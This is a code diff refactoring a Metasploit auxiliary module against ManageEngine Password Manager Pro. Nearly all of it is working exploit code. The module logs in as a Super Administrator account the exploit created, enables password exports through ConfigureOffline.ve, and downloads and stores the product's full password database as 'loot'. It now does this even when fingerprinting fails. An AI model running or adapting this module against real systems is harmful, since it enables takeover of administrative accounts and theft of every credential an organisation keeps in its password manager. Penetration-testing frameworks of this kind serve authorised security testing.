@@ -220,6 +220,10 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def run
+    unless check == Exploit::CheckCode::Appears
+      print_error("#{peer} - Fingerprint hasn't been successful, trying to exploit anyway...")
+    end
+
     version = get_version
     @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
     if @cookie == nil
@@ -232,56 +236,57 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{peer} - Created a new Super Administrator with username: #{username} | password: #{password}")
 
     cookie_su = login(username, password)
-    if cookie_su != nil
 
-      # 1st we turn on password exports
-      send_request_cgi({
-        'method' => 'POST',
-        'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
-        'cookie' => cookie_su,
-        'vars_post'  => {
-          'IS_XLS'         => 'true',
-          'includePasswd'  => 'true',
-          'HOMETAB'        => 'true',
-          'RESTAB'         => 'true',
-          'RGTAB'          => 'true',
-          'PASSWD_RULE'    => 'Offline Password File',
-          'LOGOUT_TIME'    => '20'
-        }
-      })
-
-      # now get the loot!
-      res = send_request_cgi({
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
-        'cookie' => cookie_su,
-        'vars_get' => {
-          'RequestType' => 'ExportResources'
-        }
-      })
-      if res && res.code == 200 && res.body && res.body.to_s.length > 0
-        vprint_line(res.body.to_s)
-        print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
-        loot_name     = 'manageengine.passwordmanagerpro.password.db'
-        loot_type     = 'text/csv'
-        loot_filename = 'manageengine_pmp_password_db.csv'
-        loot_desc     = 'ManageEngine Password Manager Pro Password DB'
-        p = store_loot(
-          loot_name,
-          loot_type,
-          rhost,
-          res.body,
-          loot_filename,
-          loot_desc)
-        print_status "Password database saved in: #{p}"
-      else
-        print_error("#{peer} - Failed to export Password Manager Pro passwords.")
-      end
-      status = Metasploit::Model::Login::Status::SUCCESSFUL
-    else
-      print_error("#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
-      status = Metasploit::Model::Login::Status::DENIED_ACCESS
+    if cookie_su.nil?
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
     end
+
+    # 1st we turn on password exports
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
+      'cookie' => cookie_su,
+      'vars_post'  => {
+        'IS_XLS'         => 'true',
+        'includePasswd'  => 'true',
+        'HOMETAB'        => 'true',
+        'RESTAB'         => 'true',
+        'RGTAB'          => 'true',
+        'PASSWD_RULE'    => 'Offline Password File',
+        'LOGOUT_TIME'    => '20'
+      }
+    })
+
+    # now get the loot!
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
+      'cookie' => cookie_su,
+      'vars_get' => {
+        'RequestType' => 'ExportResources'
+      }
+    })
+
+    if res && res.code == 200 && res.body && res.body.to_s.length > 0
+      vprint_line(res.body.to_s)
+      print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
+      loot_name     = 'manageengine.passwordmanagerpro.password.db'
+      loot_type     = 'text/csv'
+      loot_filename = 'manageengine_pmp_password_db.csv'
+      loot_desc     = 'ManageEngine Password Manager Pro Password DB'
+      p = store_loot(
+        loot_name,
+        loot_type,
+        rhost,
+        res.body,
+        loot_filename,
+        loot_desc)
+      print_status "Password database saved in: #{p}"
+    else
+      print_error("#{peer} - Failed to export Password Manager Pro passwords.")
+    end
+    status = Metasploit::Model::Login::Status::SUCCESSFUL
+
 
     service_data = {
       address: rhost,
